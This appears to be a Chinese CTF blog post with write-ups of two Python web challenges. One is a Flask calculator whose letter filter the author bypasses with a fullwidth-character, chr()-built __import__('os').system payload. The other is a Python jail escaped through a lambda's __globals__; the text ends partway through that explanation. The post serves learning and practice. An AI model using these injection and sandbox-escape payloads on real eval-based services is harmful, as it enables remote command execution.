<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>20250711随缘刷题 | cheng_xing's blog</title><meta name="author" content="cheng_xing"><meta name="copyright" content="cheng_xing"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="臭皮的计算器源码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051from flask import Flask, render_template, requestimport uuidimport subprocessimport osimport tempf">
<meta property="og:type" content="article">
<meta property="og:title" content="20250711随缘刷题">
<meta property="og:url" content="https://sakuraraindrop.github.io/2025/07/11/20250711%E9%9A%8F%E7%BC%98%E5%88%B7%E9%A2%98/index.html">
<meta property="og:site_name" content="cheng_xing&#39;s blog">
<meta property="og:description" content="臭皮的计算器源码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051from flask import Flask, render_template, requestimport uuidimport subprocessimport osimport tempf">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://sakuraraindrop.github.io/img/ltx.jpg">
<meta property="article:published_time" content="2025-07-10T16:22:11.000Z">
<meta property="article:modified_time" content="2025-07-14T17:22:39.229Z">
<meta property="article:author" content="cheng_xing">
<meta property="article:tag" content="php特性">
<meta property="article:tag" content="ssti">
<meta property="article:tag" content="pickle反序列化">
<meta property="article:tag" content="pyjail">
<meta property="article:tag" content="原型链污染">
<meta property="article:tag" content="极致CMS">
<meta property="article:tag" content="go模板注入">
<meta property="article:tag" content="gopher协议">
<meta property="article:tag" content="xss">
<meta property="article:tag" content="redis">
<meta property="article:tag" content="tarfile">
<meta property="article:tag" content="litestar">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://sakuraraindrop.github.io/img/ltx.jpg"><script type="application/ld+json">{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "20250711随缘刷题",
  "url": "https://sakuraraindrop.github.io/2025/07/11/20250711%E9%9A%8F%E7%BC%98%E5%88%B7%E9%A2%98/",
  "image": "https://sakuraraindrop.github.io/img/ltx.jpg",
  "datePublished": "2025-07-10T16:22:11.000Z",
  "dateModified": "2025-07-14T17:22:39.229Z",
  "author": [
    {
      "@type": "Person",
      "name": "cheng_xing",
      "url": "https://sakuraraindrop.github.io/"
    }
  ]
}</script><link rel="shortcut icon" href="/img/ltx-icon.jpg"><link rel="canonical" href="https://sakuraraindrop.github.io/2025/07/11/20250711%E9%9A%8F%E7%BC%98%E5%88%B7%E9%A2%98/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!false && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      const activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      const activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }

      btf.activateDarkMode = activateDarkMode
      btf.activateLightMode = activateLightMode

      const theme = saveToLocal.get('theme')
    
          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
        
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":true},
  copy: {
    success: '复制成功',
    error: '复制失败',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'null',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
    buttonText: '加载更多'
  },
  isPhotoFigcaption: false,
  islazyloadPlugin: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: '20250711随缘刷题',
  isHighlightShrink: false,
  isToc: true,
  pageType: 'post'
}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="web_bg" style="background-image: url(/img/hk.jpg);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/ltx.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">57</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">147</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">10</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/img/hk.jpg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><img class="site-icon" src="/img/ltx-icon.jpg" alt="Logo"><span class="site-name">cheng_xing's blog</span></a><a class="nav-page-title" href="/"><span class="site-name">20250711随缘刷题</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">20250711随缘刷题</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-07-10T16:22:11.000Z" title="发表于 2025-07-11 00:22:11">2025-07-11</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-07-14T17:22:39.229Z" title="更新于 2025-07-15 01:22:39">2025-07-15</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/web%E6%97%A5%E5%B8%B8%E5%88%B7%E9%A2%98/">web日常刷题</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h2 id="臭皮的计算器"><a href="#臭皮的计算器" class="headerlink" title="臭皮的计算器"></a>臭皮的计算器</h2><p>源码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, request</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> tempfile</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = <span class="built_in">str</span>(uuid.uuid4())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">waf</span>(<span class="params">s</span>):</span><br><span class="line">    token = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">in</span> <span class="string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span>:</span><br><span class="line">            token = <span class="literal">False</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> token</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/calc&quot;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">calc</span>():</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        num = request.form.get(<span class="string">&quot;num&quot;</span>)</span><br><span class="line">        script = <span class="string">f&#x27;&#x27;&#x27;import os</span></span><br><span class="line"><span class="string">print(eval(&quot;<span class="subst">&#123;num&#125;</span>&quot;))</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">        <span class="built_in">print</span>(script)</span><br><span class="line">        <span class="keyword">if</span> waf(num):</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                result_output = <span class="string">&#x27;&#x27;</span></span><br><span class="line">                <span class="keyword">with</span> tempfile.NamedTemporaryFile(mode=<span class="string">&#x27;w+&#x27;</span>, suffix=<span class="string">&#x27;.py&#x27;</span>, delete=<span class="literal">False</span>) <span class="keyword">as</span> temp_script:</span><br><span class="line">                    temp_script.write(script)</span><br><span class="line">                    temp_script_path = temp_script.name</span><br><span class="line"></span><br><span class="line">                result = subprocess.run([<span class="string">&#x27;python3&#x27;</span>, temp_script_path], capture_output=<span class="literal">True</span>, text=<span class="literal">True</span>)</span><br><span class="line">                os.remove(temp_script_path)</span><br><span class="line"></span><br><span class="line">                result_output = result.stdout <span class="keyword">if</span> result.returncode == <span class="number">0</span> <span class="keyword">else</span> result.stderr</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line"></span><br><span class="line">                result_output = <span class="built_in">str</span>(e)</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&quot;calc.html&quot;</span>, result=result_output)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&quot;calc.html&quot;</span>, result=<span class="string">&quot;臭皮！你想干什么！！&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;calc.html&quot;</span>, result=<span class="string">&#x27;试试呗&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">30002</span>)</span><br></pre></td></tr></table></figure>

<p>审计发现过滤了所有字母，使用全角英文和 chr() 字符拼接（或八进制）即可绕过</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_＿ｉｍｐｏｒｔ_＿(ｃｈｒ(111)+ｃｈｒ(115)).ｓｙｓｔｅｍ(ｃｈｒ(99)+ｃｈｒ(97)+ｃｈｒ(116)+ｃｈｒ(32)+ｃｈｒ(47)+ｃｈｒ(102)+ｃｈｒ(108)+ｃｈｒ(97)+ｃｈｒ(103))</span><br></pre></td></tr></table></figure>

<p>其中 111 115 分别对应 os 的 ASCII 码，99 97 116 32 47 102 108 97 103 分别对应 cat &#x2F;flag 的 ASCII 码<br>tips：发包的时候，加号要做转义处理，否则会被视作空格</p>
<h2 id="臭皮踩踩背"><a href="#臭皮踩踩背" class="headerlink" title="臭皮踩踩背"></a>臭皮踩踩背</h2><p>题目需要用 nc 连接，给出了部分源码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">ev4l</span>(<span class="params">*args</span>):</span><br><span class="line">    <span class="built_in">print</span>(secret)</span><br><span class="line">inp = <span class="built_in">input</span>(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">f = <span class="keyword">lambda</span>: <span class="literal">None</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">eval</span>(inp, &#123;<span class="string">&quot;__builtins__&quot;</span>: <span class="literal">None</span>, <span class="string">&#x27;f&#x27;</span>: f, <span class="string">&#x27;eval&#x27;</span>: ev4l&#125;))</span><br></pre></td></tr></table></figure>

<p>完整源码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;你被豌豆关在一个监狱里……&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;豌豆百密一疏，不小心遗漏了一些东西…&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#x27;&#x27;def ev4l(*args):\n\tprint(secret)\ninp = input(&quot;&gt; &quot;)\nf = lambda: None\nprint(eval(inp, &#123;&quot;__builtins__&quot;: None, &#x27;f&#x27;: f, &#x27;eval&#x27;: ev4l&#125;))&#x27;&#x27;&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;能不能逃出去给豌豆踩踩背就看你自己了，臭皮…&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ev4l</span>(<span class="params">*args</span>):</span><br><span class="line">    <span class="built_in">print</span>(secret)</span><br><span class="line"></span><br><span class="line">secret = <span class="string">&#x27;你已经拿到了钥匙，但是打开错了门，好好想想，还有什么东西是你没有理解透的？&#x27;</span></span><br><span class="line"></span><br><span class="line">inp = <span class="built_in">input</span>(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line"></span><br><span class="line">f = <span class="keyword">lambda</span>: <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;f.__globals__[&#x27;__builtins__&#x27;].eval&quot;</span> <span class="keyword">in</span> inp:</span><br><span class="line">    f.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>].<span class="built_in">eval</span> = ev4l</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    f.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>].<span class="built_in">eval</span> = <span class="built_in">eval</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">eval</span>(inp, &#123;<span class="string">&quot;__builtins__&quot;</span>: <span class="literal">None</span>, <span class="string">&#x27;f&#x27;</span>: f, <span class="string">&#x27;eval&#x27;</span>: ev4l&#125;))</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Error: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>globals 是我们当前的全局空间，如果你声明一个全局变量，它将会存在于当前的 globals 中，我们可以看一下 globals 中到底有哪些内容，直接新建一个 Python 会话：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; globals()</span><br><span class="line">&#123;&#x27;__name__&#x27;: &#x27;__main__&#x27;, &#x27;__doc__&#x27;: None, &#x27;__package__&#x27;: None, &#x27;__loader__&#x27;: &lt;class &#x27;_frozen_importlib.BuiltinImporter&#x27;&gt;, &#x27;__spec__&#x27;: None, &#x27;__annotations__&#x27;: &#123;&#125;, &#x27;__builtins__&#x27;: &lt;module &#x27;builtins&#x27; (built-in)&gt;&#125;</span><br><span class="line">&gt;&gt;&gt; x=1</span><br><span class="line">&gt;&gt;&gt; globals()</span><br><span class="line">&#123;&#x27;__name__&#x27;: &#x27;__main__&#x27;, &#x27;__doc__&#x27;: None, &#x27;__package__&#x27;: None, &#x27;__loader__&#x27;: &lt;class &#x27;_frozen_importlib.BuiltinImporter&#x27;&gt;, &#x27;__spec__&#x27;: None, &#x27;__annotations__&#x27;: &#123;&#125;, &#x27;__builtins__&#x27;: &lt;module &#x27;builtins&#x27; (built-in)&gt;, &#x27;x&#x27;: 1&#125;</span><br></pre></td></tr></table></figure>

<p>但是为什么我们能够直接调用 open() 函数呢？因为如果访问了 open 函数，如果 globals 中有，那就执行 globals 中的（可能是你自己定义的，因此存在于 globals 空间中），否则，执行 builtins 中的（类似 open eval __import__ 之类的函数都是在 builtins 中的）。</p>
<p>我们来查看一下 builtins 中到底有哪些内容：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; globals()[&#x27;__builtins__&#x27;].__dict__.keys()</span><br><span class="line">dict_keys([&#x27;__name__&#x27;, &#x27;__doc__&#x27;, &#x27;__package__&#x27;, &#x27;__loader__&#x27;, &#x27;__spec__&#x27;, &#x27;__build_class__&#x27;, &#x27;__import__&#x27;, &#x27;abs&#x27;, &#x27;all&#x27;, &#x27;any&#x27;, &#x27;ascii&#x27;, &#x27;bin&#x27;, &#x27;breakpoint&#x27;, &#x27;callable&#x27;, &#x27;chr&#x27;, &#x27;compile&#x27;, &#x27;delattr&#x27;, &#x27;dir&#x27;, &#x27;divmod&#x27;, &#x27;eval&#x27;, &#x27;exec&#x27;, &#x27;format&#x27;, &#x27;getattr&#x27;, &#x27;globals&#x27;, &#x27;hasattr&#x27;, &#x27;hash&#x27;, &#x27;hex&#x27;, &#x27;id&#x27;, &#x27;input&#x27;, &#x27;isinstance&#x27;, &#x27;issubclass&#x27;, &#x27;iter&#x27;, &#x27;aiter&#x27;, &#x27;len&#x27;, &#x27;locals&#x27;, &#x27;max&#x27;, &#x27;min&#x27;, &#x27;next&#x27;, &#x27;anext&#x27;, &#x27;oct&#x27;, &#x27;ord&#x27;, &#x27;pow&#x27;, &#x27;print&#x27;, &#x27;repr&#x27;, &#x27;round&#x27;, &#x27;setattr&#x27;, &#x27;sorted&#x27;, &#x27;sum&#x27;, &#x27;vars&#x27;, &#x27;None&#x27;, &#x27;Ellipsis&#x27;, &#x27;NotImplemented&#x27;, &#x27;False&#x27;, &#x27;True&#x27;, &#x27;bool&#x27;, &#x27;memoryview&#x27;, &#x27;bytearray&#x27;, &#x27;bytes&#x27;, &#x27;classmethod&#x27;, &#x27;complex&#x27;, &#x27;dict&#x27;, &#x27;enumerate&#x27;, &#x27;filter&#x27;, &#x27;float&#x27;, &#x27;frozenset&#x27;, &#x27;property&#x27;, &#x27;int&#x27;, &#x27;list&#x27;, &#x27;map&#x27;, &#x27;object&#x27;, &#x27;range&#x27;, &#x27;reversed&#x27;, &#x27;set&#x27;, &#x27;slice&#x27;, &#x27;staticmethod&#x27;, &#x27;str&#x27;, &#x27;super&#x27;, &#x27;tuple&#x27;, &#x27;type&#x27;, &#x27;zip&#x27;, &#x27;__debug__&#x27;, &#x27;BaseException&#x27;, &#x27;Exception&#x27;, &#x27;TypeError&#x27;, &#x27;StopAsyncIteration&#x27;, &#x27;StopIteration&#x27;, &#x27;GeneratorExit&#x27;, &#x27;SystemExit&#x27;, &#x27;KeyboardInterrupt&#x27;, &#x27;ImportError&#x27;, &#x27;ModuleNotFoundError&#x27;, &#x27;OSError&#x27;, &#x27;EnvironmentError&#x27;, &#x27;IOError&#x27;, &#x27;WindowsError&#x27;, &#x27;EOFError&#x27;, &#x27;RuntimeError&#x27;, &#x27;RecursionError&#x27;, &#x27;NotImplementedError&#x27;, &#x27;NameError&#x27;, &#x27;UnboundLocalError&#x27;, &#x27;AttributeError&#x27;, &#x27;SyntaxError&#x27;, &#x27;IndentationError&#x27;, &#x27;TabError&#x27;, &#x27;LookupError&#x27;, &#x27;IndexError&#x27;, &#x27;KeyError&#x27;, &#x27;ValueError&#x27;, &#x27;UnicodeError&#x27;, &#x27;UnicodeEncodeError&#x27;, &#x27;UnicodeDecodeError&#x27;, &#x27;UnicodeTranslateError&#x27;, &#x27;AssertionError&#x27;, &#x27;ArithmeticError&#x27;, &#x27;FloatingPointError&#x27;, &#x27;OverflowError&#x27;, &#x27;ZeroDivisionError&#x27;, &#x27;SystemError&#x27;, &#x27;ReferenceError&#x27;, &#x27;MemoryError&#x27;, &#x27;BufferError&#x27;, &#x27;Warning&#x27;, &#x27;UserWarning&#x27;, &#x27;EncodingWarning&#x27;, &#x27;DeprecationWarning&#x27;, &#x27;PendingDeprecationWarning&#x27;, &#x27;SyntaxWarning&#x27;, &#x27;RuntimeWarning&#x27;, &#x27;FutureWarning&#x27;, &#x27;ImportWarning&#x27;, &#x27;UnicodeWarning&#x27;, &#x27;BytesWarning&#x27;, &#x27;ResourceWarning&#x27;, &#x27;ConnectionError&#x27;, &#x27;BlockingIOError&#x27;, &#x27;BrokenPipeError&#x27;, &#x27;ChildProcessError&#x27;, &#x27;ConnectionAbortedError&#x27;, &#x27;ConnectionRefusedError&#x27;, &#x27;ConnectionResetError&#x27;, &#x27;FileExistsError&#x27;, &#x27;FileNotFoundError&#x27;, &#x27;IsADirectoryError&#x27;, &#x27;NotADirectoryError&#x27;, &#x27;InterruptedError&#x27;, &#x27;PermissionError&#x27;, &#x27;ProcessLookupError&#x27;, &#x27;TimeoutError&#x27;, &#x27;open&#x27;, &#x27;quit&#x27;, &#x27;exit&#x27;, &#x27;copyright&#x27;, &#x27;credits&#x27;, &#x27;license&#x27;, &#x27;help&#x27;, &#x27;_&#x27;])</span><br></pre></td></tr></table></figure>

<p>可以看到 open eval __import__ 等函数都在 builtins 中。</p>
<p>eval 函数的第一个参数就是一个字符串，即你要执行的 Python 代码，第二个参数就是一个字典，指定在接下来要执行的代码的上下文中，globals 是怎样的。</p>
<p>题目中，eval(inp, {“__builtins__“: None, ‘f’: f, ‘eval’: ev4l}) 这段代码，__builtins__ 被设置为 None，而我们输入的代码就是在这个 builtins 为 None 的上下文中执行的，我们从而失去了直接使用 builtins 中的函数的能力，像下面的代码就会报错（题目中直接输入 print(1)）：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; eval(&#x27;print(1)&#x27;, &#123;&quot;__builtins__&quot;: None&#125;)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;</span><br><span class="line">  File &quot;&lt;string&gt;&quot;, line 1, in &lt;module&gt;</span><br><span class="line">TypeError: &#x27;NoneType&#x27; object is not subscriptable</span><br></pre></td></tr></table></figure>

<p>由于全局 global 中没有 print，从而从 builtins 中寻找，而 builtins 为 None，触发错误。</p>
<p>但注意看，题目刚好给了一个匿名函数 f，看似无用，实际上参考文档已经给出提示——Python 中「一切皆对象」。故可以利用函数对象的 __globals__ 属性来逃逸。我们可以在 Python 终端测试一下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; f = lambda: None</span><br><span class="line">&gt;&gt;&gt; f.__globals__</span><br><span class="line">&#123;&#x27;__name__&#x27;: &#x27;__main__&#x27;, &#x27;__doc__&#x27;: None, &#x27;__package__&#x27;: None, &#x27;__loader__&#x27;: &lt;class &#x27;_frozen_importlib.BuiltinImporter&#x27;&gt;, &#x27;__spec__&#x27;: None, &#x27;__annotations__&#x27;: &#123;&#125;, &#x27;__builtins__&#x27;: &lt;module &#x27;builtins&#x27; (built-in)&gt;, &#x27;f&#x27;: &lt;function &lt;lambda&gt; at 0x0000026073850700&gt;&#125;</span><br></pre></td></tr></table></figure>

<p>函数的 __globals__ 记录的是这个函数所在的 globals 空间，而这个 f 函数是在题目源码的环境中（而不是题目的 eval 的沙箱中），我们从而获取到了原始的 globals 环境，然后我们便可以从这个原始 globals 中获取到原始 builtins：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">f.__globals__[&#x27;__builtins__&#x27;]</span><br></pre></td></tr></table></figure>

<p>但这里还有一个问题，如果我们直接调用 f.__globals__[‘<strong>builtins</strong>‘].eval，先不说题目会替换掉 eval 函数（实际上在点号前随便几个空格或者字符串拼接就能绕过，下不赘述），即使我们能够调用，也会报错：</p>
